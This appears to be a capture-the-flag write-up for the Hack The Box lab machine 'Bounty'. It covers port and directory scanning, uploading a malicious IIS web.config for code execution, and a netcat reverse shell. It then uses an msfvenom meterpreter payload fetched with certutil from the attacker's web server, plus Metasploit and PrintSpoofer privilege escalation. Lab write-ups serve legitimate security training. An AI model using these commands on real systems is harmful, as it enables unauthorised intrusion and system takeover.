# Bounty

# Recon

## PortScan

`nmap -sCV -T4 10.10.10.93`

![Untitled](images/Untitled.png)

## Web

Simple static page

![Untitled](images/Untitled%201.png)

Lets add the IP to our `hosts` file

### Directory Discover

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://bounty.htb/`

![Untitled](images/Untitled%202.png)

By using another wordlist found this directory

![Untitled](images/Untitled%203.png)

`gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u [http://bounty.htb/](http://bounty.htb/) -x asp,aspx,config`

After using another wordlist found this

![Untitled](images/Untitled%204.png)

Now that we can upload `web.config` maybe some `ASP` payload

I used this one [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload Insecure Files/Configuration IIS web.config/web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config) save it to a file and upload, after uploading go to this URL `http://bounty.htb/uploadedfiles/web.config`

By running `whoami` we get the response so maybe we can do a reverse shell

![Untitled](images/Untitled%205.png)

### Getting a shell

Open a netcat listener

`nc -lvnp 1234`

I used this powershell reverse shell

![Untitled](images/Untitled%206.png)

Copy the code and paste it inside the input field

![Untitled](images/Untitled%207.png)

And we got a shell

![Untitled](images/Untitled%208.png)

Getting user flag

`cat user.txt`

![Untitled](images/Untitled%209.png)

### Getting a meterpreter session

Create a msfvenom payload

`msfvenom -p windows/meterpreter/reverse_tcp lhost={LOCAL-IP} lport=9999 -f exe > shell.exe`

![Untitled](images/Untitled%2010.png)

Open a python web server inside the directory of the shell

`python3 -m http.server 80`

Inside the windows machine download the `shell.exe` using `certutil -urlcache -f http://{LOCAL-IP}/shell.exe shell.exe`

![Untitled](images/Untitled%2011.png)

Now we need to setup a handler

Open metasploit using the command 

`msfconsole`

Use the handler module

`use multi/handler`

`set payload windows/meterpreter/reverse_tcp`

`set lhost {LOCAL-IP}`

`set lport 9999`

`run`

![Untitled](images/Untitled%2012.png)

Now open the `shell.exe` inside the windows

`./shell.exe`

![Untitled](images/Untitled%2013.png)

And we got a meterpreter session

![Untitled](images/Untitled%2014.png)

## Privilege Escalation

Go to windows shell using

`shell`

Get current privileges

`whoami /privs`

![Untitled](images/Untitled%2015.png)

We gonna use PrintSpoofer privilege escalation method so lets download the `.exe`

Go to this link [https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) and download this file

![Untitled](images/Untitled%2016.png)

Put the shell on the background

![Untitled](images/Untitled%2017.png)

Now lets upload that file to the windows machine

`upload /home/zodiac/htb/bounty/PrintSpoofer64.exe`

![Untitled](images/Untitled%2018.png)

### Finding an exploit

`use multi/recon/local_exploit_suggester`

`set session 1`

`run`

![Untitled](images/Untitled%2019.png)

Im gonna use the reflection_juicy

`use exploit/windows/local/ms16_075_reflection_juicy`

`set lhost tun0`

`set session 1`

`exploit`

![Untitled](images/Untitled%2020.png)

And we can verify our user by doing

`getuid`

![Untitled](images/Untitled%2021.png)

Get the root flag

![Untitled](images/Untitled%2022.png)
